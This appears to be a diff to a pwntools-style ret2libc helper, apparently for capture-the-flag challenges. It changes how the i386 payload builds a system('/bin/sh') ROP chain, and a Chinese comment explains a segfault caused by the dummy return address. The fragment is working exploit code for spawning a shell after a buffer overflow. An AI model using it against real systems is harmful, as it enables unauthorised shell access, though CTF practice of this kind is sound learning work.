@@ -81,7 +81,12 @@ def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret):
     
     info(f"system {hex(system)} ; binsh {hex(binsh)}")
     if context.arch == "i386":
-        payload = fill2ret + psize(system)+psize(0x12345678)+psize(binsh)
+        # payload = fill2ret + psize(system)+psize(0x12345678)+psize(binsh)
+        """
+        这里因为一道题的机制，printf把0x12345678作为参数传进去导致了sf，所以把它换成了可打印的指针
+        """
+        payload = fill2ret + psize(system)+psize(binsh)+psize(binsh)
+        
     elif context.arch == "amd64":
         ret = rop(loader.root, "ret")
         pop_rdi_ret = rop(loader.root, "pop rdi ; ret")
